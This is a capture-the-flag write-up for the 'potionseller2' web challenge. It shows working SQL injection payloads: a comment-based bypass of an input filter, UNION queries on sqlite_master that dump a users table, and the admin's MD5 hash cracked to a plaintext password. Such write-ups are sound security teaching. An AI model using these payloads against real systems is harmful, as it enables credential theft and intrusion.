# potionseller2

## What it is

Almost the same as potionseller except:
- The strongest potion is available without injection
- A link to the "Admin Space" appeared on the site, connecting requires a login and a password

## Solution

(see solve.js)

We need to get credentials for the admin.

The server has new measures in place to catch injection attempts:
```
https://potionseller2.secu-web.blackfoot.dev/potions/1 or 1=1
```
```json
{
  "err": "That looks like code! I don't like code, only potions!"
}
```

A lot of these measures can be bypassed by replacing spaces with empty comments ```/**/``` -> ```%2f**%2f``` ([source](https://portswigger.net/support/sql-injection-bypassing-common-filters)):
```
https://potionseller2.secu-web.blackfoot.dev/potions/7 or id > 4
-> https://potionseller2.secu-web.blackfoot.dev/potions/7%2f**%2for%2f**%2fid%2f**%2f>%2f**%2f4
```
```json
{
  "potion": {
    "id": 5,
    "name": "Truth Serum (6x)",
    "description": "Perfect for questing adventurers or for wild parties!",
    "price": 600,
    "img": "http://payload138.cargocollective.com/1/3/107627/5077854/TruthSerum_jpeg_02_800.jpg",
    "longdescription": "From the mines of Moria straight to your local potion dealer, this 6-pack Truth Serum is bound to help you in your interrogations - and also makes for a great time with your party when the adventure is over!"
  }
}
```


We can list all tables using ```UNION``` and the ```sqlite_master``` table ([sqlite system tables](https://www.techonthenet.com/sqlite/sys_tables/index.php)):
```
https://potionseller2.secu-web.blackfoot.dev/potions/7 ) union SELECT *,null FROM sqlite_master where type is 'table' and tbl_name is not 'potions'-- -
```
```json
{
  "potion": {
    "id": "table",
    "name": "users",
    "description": "users",
    "price": 3,
    "img": "CREATE TABLE users(id INT PRIMARY KEY, username TEXT NOT NULL, password TEXT NOT NULL)",
    "longdescription": null
  }
}
```

To get the users:
```
https://potionseller2.secu-web.blackfoot.dev/potions/7 ) union SELECT *,null,null,null FROM users-- -
```
```json
{
  "potion": {
    "id": 0,
    "name": "potionSellerRoot",
    "description": "367ab14fdf7fa39f96143302dc5b7ef9",
    "price": null,
    "img": null,
    "longdescription": null
  }
}
```

The login is ```potionSellerRoot``` and the password hash is ```367ab14fdf7fa39f96143302dc5b7ef9```.

Using a [hash cracking website](https://hashes.com/en/decrypt/hash) we can get the password (it is a MD5).

password: ```potions```

We can now login to the Admin Space and get the flag.

flag: ```BFS{Y4Y_f0R_5qLi!}```
